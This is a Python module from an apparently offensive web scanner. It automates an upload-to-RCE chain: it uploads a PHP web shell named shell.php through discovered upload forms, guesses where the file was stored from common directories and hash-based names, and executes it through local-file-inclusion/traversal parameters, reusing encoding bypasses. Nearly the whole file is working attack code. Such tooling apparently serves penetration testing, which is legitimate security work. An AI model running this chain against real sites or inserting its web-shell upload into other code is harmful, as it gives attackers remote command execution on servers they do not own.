"""Upload -> guess-filename -> trigger-RCE chain for INCLUDED's crawl mode.

Closes a gap pure discovery can't: some apps let you upload a file (an
"apply" form, an avatar uploader, ...) and separately have an LFI/traversal
sink elsewhere with no visible link between the two — the vulnerable
parameter may only exist in server source, never in a link. This uploads a
small PHP web shell through a discovered UploadForm, guesses where it
landed using common storage conventions, and tries including each guess
through every other discovered candidate — reusing TraversalModule as-is
for the actual "trigger" request, since its existing depth/prefix/encoding
sweep already covers the double-URL-encoding bypass this kind of chain
typically needs (see http_client.encode_payload / -e all).
"""
from __future__ import annotations

import hashlib
from dataclasses import dataclass, replace

import aiohttp

from .config import Config
from .crawler import Candidate, UploadForm
from .detection import Finding, cmd_with_marker
from .http_client import HttpClient
from .modules.traversal import TraversalModule

# Common storage locations + naming conventions for uploaded files.
_UPLOAD_DIRS = ("uploads/", "upload/", "files/", "media/", "storage/", "")


@dataclass(frozen=True)
class ChainResult:
    upload_form: UploadForm
    guess: str
    trigger: Candidate
    finding: Finding

    def label(self) -> str:
        return f"upload via {self.upload_form.method} {self.upload_form.url} -> {self.guess} -> {self.trigger.label()}"


def _shell_content(cmd: str) -> str:
    return f"<?php system('{cmd_with_marker(cmd)}'); ?>"


def _guess_paths(content: bytes, original_name: str) -> list[str]:
    md5 = hashlib.md5(content).hexdigest()
    sha1 = hashlib.sha1(content).hexdigest()
    names = dict.fromkeys((original_name, f"{md5}.php", md5, f"{sha1}.php"))  # dedup, keep order
    return [f"{d}{n}" for d in _UPLOAD_DIRS for n in names]


async def _upload(cfg: Config, form: UploadForm, content: str, filename: str) -> bool:
    """POST the shell as real multipart/form-data. Returns whether the
    upload request itself succeeded (2xx/3xx) — doesn't (can't, without a
    hint) confirm the storage path; that's what the guesses are for."""
    data = aiohttp.FormData()
    for name, value in form.other_fields:
        data.add_field(name, value)
    data.add_field(form.file_field, content, filename=filename, content_type="application/octet-stream")

    connector = aiohttp.TCPConnector(ssl=cfg.verify_tls)
    async with aiohttp.ClientSession(
        connector=connector, headers=cfg.headers, cookies=cfg.cookies,
        timeout=aiohttp.ClientTimeout(total=cfg.timeout),
    ) as session:
        try:
            async with session.request(form.method, form.url, data=data, proxy=cfg.proxy) as resp:
                return resp.status < 400
        except Exception:
            return False


async def run_upload_chains(cfg: Config, upload_forms: list[UploadForm],
                             candidates: list[Candidate], *,
                             verbose: bool = False) -> list[ChainResult]:
    """Upload a web shell through each UploadForm, then try every guessed
    storage path through every GET candidate (other than the upload form's
    own fields), stopping at the first confirmed hit per form."""
    triggers = [c for c in candidates if c.method == "GET"]
    results: list[ChainResult] = []
    if not triggers:
        return results

    for form in upload_forms:
        shell = _shell_content(cfg.cmd)
        filename = "shell.php"
        if verbose:
            print(f"    [chain] uploading web shell via {form.method} {form.url} (field={form.file_field})")
        if not await _upload(cfg, form, shell, filename):
            if verbose:
                print("    [chain] upload failed, skipping this form")
            continue

        guesses = _guess_paths(shell.encode(), filename)
        if verbose:
            print(f"    [chain] trying {len(guesses)} path guess(es) x {len(triggers)} trigger(s)")

        hit = None
        for trigger in triggers:
            if trigger.url.split("?", 1)[0] == form.url.split("?", 1)[0]:
                continue  # skip the upload form's own fields as a trigger
            for guess in guesses:
                cand_cfg = replace(cfg, url=trigger.url, method=trigger.method,
                                    data=trigger.data, param=None, target_file=guess)
                async with HttpClient(cand_cfg) as client:
                    findings = await TraversalModule(cand_cfg).run(client)
                if findings:
                    hit = ChainResult(form, guess, trigger, findings[0])
                    break
            if hit:
                break

        if hit:
            results.append(hit)

    return results
